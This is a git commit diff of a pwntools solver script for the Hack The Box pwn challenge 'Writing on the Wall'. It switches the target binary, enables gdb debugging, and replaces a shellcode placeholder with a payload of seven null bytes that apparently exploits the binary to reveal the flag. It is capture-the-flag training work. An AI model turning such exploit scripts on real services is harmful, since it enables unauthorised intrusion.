8ddf2f835ee3f8c046859e69721fd4ef0871987f
Zhe Feng <zhef@umich.edu>
2025-02-24 00:53:26 -0500

    finish pwn challenge Writing on the Wall.

--- hackthebox/challenges/writing-on-the-wall/solver.py
+++ hackthebox/challenges/writing-on-the-wall/solver.py
@@ -1,5 +1,3 @@
-# Copied from the challenge "El Teteo"
-
 #!/usr/bin/python3
 from pwn import *
 import warnings
@@ -7,27 +5,22 @@ import os
 warnings.filterwarnings('ignore')
 context.arch = 'amd64'
 
-fname = './el_teteo' 
+fname = './writing_on_the_wall' 
 
 os.system('clear')
 
 if len(sys.argv) < 2:
   print('Running solver locally..\n')
-  r    = process(fname)
-  # r = gdb.debug(fname, gdbscript='break main\ncontinue')
+  # r    = process(fname)
+  r = gdb.debug(fname, gdbscript='break main\ncontinue')
 else:
   IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
   PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
   r    = remote(IP, PORT)
   print(f'Running solver remotely at {IP} {PORT}\n')
 
-# Shellcode from https://shell-storm.org/shellcode/files/shellcode-806.html
-sc = "add payload here" # ADD THE CORRECT PAYLOAD HERE
-
-# Send shellcode
-r.sendlineafter('>', sc)
+r.sendlineafter('out?', "\x00"*7)
 
 # Get flag
 pause(1)
-r.sendline('cat flag*')
 print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
